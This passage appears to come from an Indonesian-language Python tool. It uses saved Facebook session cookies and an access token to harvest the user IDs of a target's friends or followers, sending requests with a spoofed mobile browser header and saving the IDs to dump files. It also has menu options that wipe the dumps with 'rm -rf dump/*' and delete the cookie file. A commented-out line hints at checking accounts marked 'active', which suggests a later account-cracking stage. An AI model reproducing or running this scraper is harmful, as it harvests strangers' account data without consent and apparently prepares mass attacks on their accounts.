				if x["e"] in rs.text:
					exit(x["p"])
			if not "profile.php" in u:
				rs = r.get(u.split("friends")[0], cookies=self.c)
			u = re.search("lst=\d*%3A(\d*)%3A\d*", rs.text).group(1) if not "profile.php" in u else u.split("=")[1].split("&")[0]
			fd = m.fl(u)
			if not fd:
				exit(" .! gagal ngambil id")
			self.sv(fd, bs(rs.text, "html.parser").find("title").text)
		elif sl == "2":
			u = input(" ?> id: ")
			while not u:
				u = input(" ?> id: ")
			assert u.isdigit()
			rs = r.get("https://graph.facebook.com/"+u+"/?access_token="+self.t, headers={"Host": "graph.facebook.com", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36", "accept": "application/json, text/plain, */*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "origin": "https://www.facebook.com", "referer": "https://www.facebook.com"}).json()["name"]
			fd = m.fs(u)
			if not fd:
				exit(" .! gagal ngambil id")
			self.sv(fd, rs+"_followers")
		elif sl == "3":
			exit(os.system("rm -rf dump/*"))
		elif sl == "4":
			exit(cu())
		elif sl == "5":
			exit(self.start())
		elif sl == "6":
			exit(os.remove(".biskuit"))
		elif sl == "0":
			exit(" # adiosss")

h = "https://free.facebook.com"
run = main()
run.base()

#for x in open("result/tes").read().splitlines():
	#apc("active", cvd(x.split("|")[-1]))
